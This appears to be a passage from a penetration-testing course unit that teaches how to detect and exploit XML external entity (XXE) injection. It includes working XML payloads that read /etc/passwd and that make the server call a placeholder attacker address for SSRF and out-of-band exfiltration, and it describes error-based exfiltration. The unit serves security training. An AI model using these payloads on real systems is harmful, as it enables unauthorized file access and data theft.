This Learning Unit covers the following Learning Objectives:

1. Understand how to test for XXE injection vulnerabilities
2. Learn several techniques for exfiltrating data using XXE vulnerabilities

If we encounter an application that handles XML input, we should test the application for an XXE vulnerability. For example, consider this simple internal entity reference.

```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

When an XML parser encounters an entity reference, it replaces the reference with the entity's value. In this example, if the parser replaces the entity reference "&lastname;" with "Replaced" (the entity's value), the parser is vulnerable to XXE. In this case, if an application used the parsed results and displayed the contact's name, it would display "Tom Replaced".

It's important to note that in order for the entity to be accessed, the application must parse the XML. This means that the XML must be well-formed and in a format that the application expects. If we discover an application that processes XML, we should try to obtain an example XML document used by the application to use as the basis of our attack payload. If we introduce a new element in an XML document that an application is not expecting, the application may throw an error and not fully parse the XML.

Before we examine our case study, let's discuss a few ways we can exploit an XXE vulnerability to exfiltrate data from a system or web server.


------------
#### 10.3.1 Retrieving Files

Once we have verified the existence of an XXE vulnerability, we can attempt to retrieve files from the server. This is easiest when the application returns the parsed results immediately, or displays the results somewhere else within the application. For example, consider this external entity that references a file on the server.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

A vulnerable parser will load the file contents and place them in the XML document. In the example of Listing 14, a vulnerable parser would read in the contents of /etc/passwd and place that content in between the _lastName_ tags. If the server responds with the _lastName_ contents, or we can retrieve the data in another way after the XML has been parsed, we can use this vulnerability to read files on the server. This is a fundamental XXE attack technique.

In short, this technique is most easily exploited when we can retrieve the results of the XXE attack. This is why we often attempt to inject the XXE payload into a field that the application displays.

----------------

#### 10.3.2. Error-based Testing

If we cannot observe the results of our XXE attack and the application returns verbose error messages, we can use them to exfiltrate information. There are a few ways we can do this. If the application parses XML data and saves the results in a database, we can try to force a SQL error based on column data type or length. Alternatively, we could generate an error by forcing the parser to access a file that doesn't exist. We can stack parameter entities so that the contents of the file we want to retrieve are appended to the name of the non-existent file. When we retrieve these responses in the same "channel" or data stream as the exploit, this is known as _in-band exfiltration_.

-----------

#### 10.3.3. Out-of-Band Testing

We may also be able to retrieve data through another channel. This is known as _out-of-band exfiltration_. For example, since external entities can reference resources on other servers, we can use entities to access other servers in a _server-side request forgery_ (SSRF) attack or as a means to exfiltrate data back to a server we control.

The previous example referenced a URI with the file protocol. We could also use HTTP or HTTPS, as shown below.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "http://<our ip address>/somefile">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```
When an application parses this type of external entity, it will send a GET request to the specified URL. This is useful when the application we are targeting has access to internal systems that might not be directly available to us. This may include internal applications within the company, or administrative interfaces accessible only to local users. Other protocols might be available depending on the programming language and application configuration.







